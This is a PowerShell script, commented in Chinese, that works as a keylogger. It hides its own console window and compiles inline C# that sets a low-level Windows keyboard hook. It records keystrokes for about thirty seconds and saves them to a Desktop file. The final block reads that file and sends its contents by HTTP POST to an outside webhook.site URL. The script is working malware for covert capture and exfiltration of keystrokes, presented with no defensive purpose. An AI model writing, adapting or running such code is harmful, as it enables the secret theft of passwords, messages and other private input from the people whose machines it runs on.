Add-Type -AssemblyName System.Windows.Forms
Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;
    public class ConsoleWindow {
        [DllImport("user32.dll", SetLastError = true)]
        public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll", SetLastError = true)]
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    }
"@

# 寻找PowerShell窗口的句柄
$hWnd = [ConsoleWindow]::FindWindow([NullString]::Value, $host.ui.RawUI.WindowTitle)

# 隐藏窗口，0是隐藏，5是显示
if ($hWnd -ne [IntPtr]::Zero) {
    [ConsoleWindow]::ShowWindow($hWnd, 0)
}

$code = @'
using System;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.IO;
using System.Threading;

public class KeyLogger
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private IntPtr hookId = IntPtr.Zero;
    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private LowLevelKeyboardProc proc;
    public static string KeysLogged { get; private set; }

    public KeyLogger()
    {
        KeysLogged = "";
    }

    public void Start()
    {
        proc = HookCallback;
        hookId = SetHook(proc);
        var timer = new System.Threading.Timer(Stop, null, 30000, System.Threading.Timeout.Infinite);  // Set timer to stop logging after 1 minute
        Application.Run();
    }

    public void Stop(object state)
    {
        UnhookWindowsHookEx(hookId);
        File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\KeyLog.txt", KeysLogged);
        Application.Exit();
    }

    private IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
        using (var curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            KeysLogged += ((Keys)vkCode).ToString();
        }
        return CallNextHookEx(hookId, nCode, wParam, lParam);
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
}
'@

Add-Type -TypeDefinition $code -ReferencedAssemblies System.Windows.Forms

$logger = New-Object KeyLogger
$logger.Start()

# 设置文件路径和Webhook URL
$filePath = "$env:USERPROFILE\Desktop\keylog.txt"
$webhookUrl = "https://webhook.site/ad722933-85ba-4660-99fa-b651377f7aa8"

# 检查文件是否存在
if (Test-Path -Path $filePath) {
    # 读取文件内容
    $fileContent = Get-Content -Path $filePath
    
    # 如果文件内容不为空，则发送到Webhook
    if ($null -ne $fileContent) {
        # 将内容合并为单个字符串（如果有多行）
        $postData = $fileContent -join "`n"
        
        # 使用Invoke-RestMethod发送POST请求
        $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $postData
        
        # 打印响应，如果需要的话
        Write-Host "Server responded with: $response"
    } else {
        Write-Host "The file is empty. Nothing to send."
    }
} else {
    Write-Host "File does not exist at the specified path."
}